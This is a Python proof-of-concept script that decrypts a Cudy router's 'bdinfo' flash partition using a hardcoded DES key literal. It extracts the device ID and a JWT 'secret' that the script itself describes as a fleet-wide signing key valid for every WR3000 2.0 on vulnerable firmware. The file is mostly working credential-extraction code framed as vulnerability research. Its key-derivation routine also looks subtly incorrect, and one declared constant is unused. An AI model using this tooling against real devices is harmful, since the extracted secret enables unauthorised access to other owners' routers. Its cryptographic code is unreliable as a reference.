#!/usr/bin/env python3
"""
decrypt_bdinfo.py — decrypt a Cudy `bdinfo` MTD partition dump.

Cudy's libbdinfo.so stores board data ("key = value" lines, including the
`deviceid` and the JWT HMAC `secret` used by Mosquitto's auth plugin) in a
DES-CBC encrypted MTD partition:

    key = DES_string_to_key("88T3j05dtFu8=")     # literal in libbdinfo.so
    iv  = 8 zero bytes
    pt  = DES-CBC-decrypt(dump)

Both the literal and the zero IV were verified by disassembling
libbdinfo.so from firmware 2.4.15 (CVE-2026-71960 research).

Usage (against a dump from YOUR OWN device, e.g.
`cat /dev/mtd$(grep bdinfo /proc/mtd ... ) > bdinfo.bin`):
    python3 decrypt_bdinfo.py bdinfo.bin

Requires: pycryptodome  (pip install pycryptodome)
Authorised research only.
"""
import argparse
import re
import sys

LITERAL = b"88T3j05dtFu8="   # DES key literal shipped in /usr/lib/libbdinfo.so
FLOOR = 0x5E0BB6D0           # 'exp' grant floor enforced by auth_plugin_jwt.so


def parity(b):
    """Force odd parity on each byte (DES convention)."""
    out = bytearray()
    for x in b:
        x &= 0xFE
        p = bin(x).count("1") & 1
        out.append(x | (1 - p))
    return bytes(out)


def des_string_to_key(s: bytes) -> bytes:
    """MIT Kerberos / OpenSSL DES_string_to_key (no salt), per RFC 3961."""
    if len(s) % 2:
        s = s + b"\x00"                      # pad to even length
    temp = bytearray(8)
    for i, ch in enumerate(s):
        temp[i % 8] ^= (ch << 1) & 0xFF
        if i >= 8:
            temp[7 - (i % 8)] ^= ch
    temp = parity(temp)
    from Crypto.Cipher import DES            # zero key + zero IV CBC pass
    cbc = DES.new(b"\x00" * 8, DES.MODE_CBC, b"\x00" * 8)
    return parity(cbc.encrypt(temp))


def des_cbc_decrypt(key: bytes, data: bytes) -> bytes:
    from Crypto.Cipher import DES
    pad = (-len(data)) % 8
    cbc = DES.new(key, DES.MODE_CBC, b"\x00" * 8)
    return cbc.decrypt(data + b"\x00" * pad)[:len(data)]


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("dump", help="raw bdinfo MTD dump (from your own device)")
    ap.add_argument("--key-literal", default=LITERAL.decode(),
                    help="DES key literal extracted from libbdinfo.so")
    args = ap.parse_args()

    key = des_string_to_key(args.key_literal.encode())
    print(f"[*] DES key (string-to-key of {args.key_literal!r}): {key.hex()}")
    for i, b in enumerate(key):
        print(f"    key[{i}] = 0x{b:02x} ({b:08b}, parity {b & 1})")

    blob = open(args.dump, "rb").read()
    pt = des_cbc_decrypt(key, blob)
    printable = sum(32 <= b < 127 or b in (9, 10, 13) for b in pt)
    if printable / max(len(pt), 1) < 0.6:
        print("[!] plaintext ratio low — dump may not be a bdinfo partition,")
        print("    or the format differs on this firmware. Raw tail shown below.")
    kv = dict(re.findall(rb"(\w+)\s*=\s*([^\r\n]+)", pt))
    print(f"[+] parsed {len(kv)} key = value pairs:")
    for k, v in kv.items():
        tag = ""
        if k == b"secret":
            tag = "   <-- fleet-wide JWT signing key (CVE-2026-71960)"
        if k == b"deviceid":
            tag = "   <-- 12-digit mesh identifier (needed in JWT username)"
        print(f"    {k.decode(errors='replace'):12} = {v.decode(errors='replace')}{tag}")
    if b"secret" in kv:
        print("\n[!] handle this material responsibly: it authenticates to every")
        print("    WR3000 2.0 on vulnerable firmware, not only to your device.")


if __name__ == "__main__":
    main()
